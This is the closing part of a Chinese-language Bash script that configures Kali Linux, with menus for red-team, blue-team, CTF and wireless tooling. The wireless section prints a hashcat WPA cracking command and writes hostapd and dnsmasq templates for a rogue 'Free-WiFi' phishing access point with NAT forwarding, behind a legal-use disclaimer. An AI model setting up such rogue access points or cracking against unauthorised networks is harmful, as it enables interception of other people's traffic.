echo "    hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt"
WIFI
    chmod +x /opt/wifi-capture.sh
    step_ok "WiFi 抓包脚本 → /opt/wifi-capture.sh"

    press_enter
}

# ── 5.3  AP 钓鱼 ──
wifi_phishing() {
    section_title "5.3  AP 钓鱼环境搭建"

    echo -e "   ${RED}${BOLD}⛔ 仅限授权的安全测试！私自搭建钓鱼 WiFi 属于违法行为！${NC}"
    echo ""

    if confirm_default_yes "安装 hostapd + dnsmasq 并生成配置模板？"; then
        apt install -y hostapd dnsmasq 2>/dev/null || true

        mkdir -p /opt/ap-phishing

        cat > /opt/ap-phishing/hostapd.conf << 'HOSTAPD'
# ═══════════════════════════════════════════════════════
#  钓鱼 AP 配置模板 — hostapd · Mr.li8848
#  用法: hostapd /opt/ap-phishing/hostapd.conf
# ═══════════════════════════════════════════════════════
interface=wlan0
driver=nl80211
ssid=Free-WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
HOSTAPD

        cat > /opt/ap-phishing/dnsmasq.conf << 'DNSMASQ'
# ═══════════════════════════════════════════════════════
#  DHCP & DNS 配置 — dnsmasq · Mr.li8848
#  用法: dnsmasq -C /opt/ap-phishing/dnsmasq.conf
# ═══════════════════════════════════════════════════════
interface=wlan0
dhcp-range=192.168.10.100,192.168.10.200,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=114.114.114.114
server=223.5.5.5
DNSMASQ

        step_ok "AP 钓鱼配置模板 → /opt/ap-phishing/"
        echo ""
        echo -e "   ${BOLD}使用流程:${NC}"
        echo -e "   ${CYAN}1.${NC} hostapd /opt/ap-phishing/hostapd.conf    ${DIM}# 启动 AP${NC}"
        echo -e "   ${CYAN}2.${NC} dnsmasq -C /opt/ap-phishing/dnsmasq.conf  ${DIM}# 启动 DHCP${NC}"
        echo -e "   ${CYAN}3.${NC} iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"
        echo -e "   ${CYAN}4.${NC} echo 1 > /proc/sys/net/ipv4/ip_forward        ${DIM}# 开启转发${NC}"
    fi

    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  关于 & 免责声明
# ////////////////////////////////////////////////////////////////////////////

show_about() {
    clear
    echo ""
    echo -e "  ${BOLD}${CYAN}"
    echo "  ╔══════════════════════════════════════════════════════════╗"
    echo "  ║                                                          ║"
    echo "  ║     Kali Linux 全方位配置脚本                          ║"
    echo "  ║                                                          ║"
    echo "  ║     作者 : Mr.li8848                                    ║"
    echo "  ║     版本 : v3.0                                         ║"
    echo "  ║     日期 : 2026-07                                      ║"
    echo "  ║     协议 : MIT (仅供合法用途)                            ║"
    echo "  ║                                                          ║"
    echo "  ╚══════════════════════════════════════════════════════════╝"
    echo -e "  ${NC}"

    echo -e "  ${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}功能模块总览${NC}"
    echo -e "  ${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "  ${GREEN}一${NC}  系统基础初始化  ${DIM}—— 换源 · 账号加固 · 常用工具 · SSH${NC}"
    echo -e "  ${RED}二${NC}  红队工具链      ${DIM}—— 信息收集 · 靶场 · 内网 · 后渗透${NC}"
    echo -e "  ${BLUE}三${NC}  蓝队/等保       ${DIM}—— 扫描器 · 基线核查 · 流量 · 应急${NC}"
    echo -e "  ${MAGENTA}四${NC}  CTF 竞赛       ${DIM}—— 密码学 · 逆向 · Web · 隐写${NC}"
    echo -e "  ${CYAN}五${NC}  无线安全       ${DIM}—— 网卡驱动 · aircrack-ng · AP 钓鱼${NC}"
    echo ""

    echo -e "  ${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${RED}${BOLD}  ⚠  免责声明${NC}"
    echo -e "  ${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "  ${WHITE}本脚本仅供以下合法场景使用:${NC}"
    echo -e "    ${CYAN}•${NC} 授权的渗透测试与红队演练"
    echo -e "    ${CYAN}•${NC} 网络安全教学与学术研究"
    echo -e "    ${CYAN}•${NC} 自有系统 / 获得书面授权的第三方系统的安全评估"
    echo ""
    echo -e "  ${RED}严禁用于:${NC}"
    echo -e "    ${RED}•${NC} 未授权的网络入侵或攻击"
    echo -e "    ${RED}•${NC} 任何违反《中华人民共和国网络安全法》《刑法》第285/286条的行为"
    echo -e "    ${RED}•${NC} 获取、出售、传播非法获取的数据"
    echo ""
    echo -e "  ${WHITE}使用者须对自身行为承担全部法律责任。${NC}"
    echo -e "  ${DIM}作者不对任何滥用、误用或违法行为承担责任。${NC}"
    echo ""

    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  主菜单
# ////////////////////////////////////////////////////////////////////////////

main_menu() {
    while true; do
        clear
        echo ""
        echo -e "  ${BOLD}${CYAN}"
        echo "  ╔══════════════════════════════════════════════════════════╗"
        echo "  ║                                                          ║"
        echo "  ║       Kali Linux 全方位配置脚本                        ║"
        echo "  ║       Author: Mr.li8848                                 ║"
        echo "  ║       Version: v3.0                                     ║"
        echo "  ║                                                          ║"
        echo "  ╚══════════════════════════════════════════════════════════╝"
        echo -e "  ${NC}"

        echo -e "  ${BOLD}${WHITE}请选择操作模块:${NC}"
        echo ""
        echo -e "  ${GREEN}${BOLD}  [1]${NC}  系统基础初始化    ${GREEN}━━ 所有用户必做${NC}"
        echo -e "          ${DIM}换源测速 · 账号加固 · 常用工具 · SSH · 字典库${NC}"
        echo ""
        echo -e "  ${RED}${BOLD}  [2]${NC}  渗透测试 / 红队   ${RED}━━ 攻击方工具链${NC}"
        echo -e "          ${DIM}Burp Suite · 信息收集 · 靶场 · 内网 · 持久化${NC}"
        echo ""
        echo -e "  ${BLUE}${BOLD}  [3]${NC}  安全运维 / 蓝队   ${BLUE}━━ 防守方工具链${NC}"
        echo -e "          ${DIM}漏洞扫描 · 基线核查 · 流量分析 · 应急响应${NC}"
        echo ""
        echo -e "  ${MAGENTA}${BOLD}  [4]${NC}  CTF 竞赛专属      ${MAGENTA}━━ 夺旗必备${NC}"
        echo -e "          ${DIM}密码学 · 二进制逆向 · Web · 隐写取证${NC}"
        echo ""
        echo -e "  ${CYAN}${BOLD}  [5]${NC}  无线安全          ${CYAN}━━ WiFi 攻防${NC}"
        echo -e "          ${DIM}抓包驱动 · aircrack-ng · AP 钓鱼${NC}"
        echo ""
        echo -e "  ${YELLOW}${BOLD}  [6]${NC}  新手避坑指南      ${YELLOW}━━ 拿到 Kali 先看这个${NC}"
        echo ""
        echo -e "  ${DIM}  [A]  关于 & 免责声明${NC}"
        echo -e "  ${DIM}  [Q]  退出${NC}"
        echo ""
        echo -e "  ${DIM}──────────────────────────────────────────────────────────${NC}"
        echo -e "  ${DIM}日志文件: ${LOG_FILE}${NC}"
        echo -e "  ${DIM}启动时间: ${START_TIME}${NC}"
        echo -e "  ${DIM}──────────────────────────────────────────────────────────${NC}"
        echo ""

        local CHOICE
        read -p "  $(echo -e "请输入选择 [1-6/A/Q]: ")" CHOICE

        case "$CHOICE" in
            1) section_one ;;
            2) section_two ;;
            3) section_three ;;
            4) section_four ;;
            5) section_five ;;
            6) show_warnings ;;
            A|a) show_about ;;
            Q|q)
                echo ""
                echo -e "  ${GREEN}感谢使用，再见！${NC}"
                echo -e "  ${DIM}完整日志: ${LOG_FILE}${NC}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "  ${RED}无效选项，请重新输入${NC}"
                sleep 0.5
                ;;
        esac
    done
}

# ////////////////////////////////////////////////////////////////////////////
#  入口
# ////////////////////////////////////////////////////////////////////////////

check_root

# 初始化日志文件
{
    echo "═══════════════════════════════════════════"
    echo "  Kali Linux 配置日志"
    echo "  启动时间: ${START_TIME}"
    echo "  脚本版本: v3.0"
    echo "  作者    : Mr.li8848"
    echo "═══════════════════════════════════════════"
    echo ""
} > "$LOG_FILE"

# 启动主菜单
main_menu
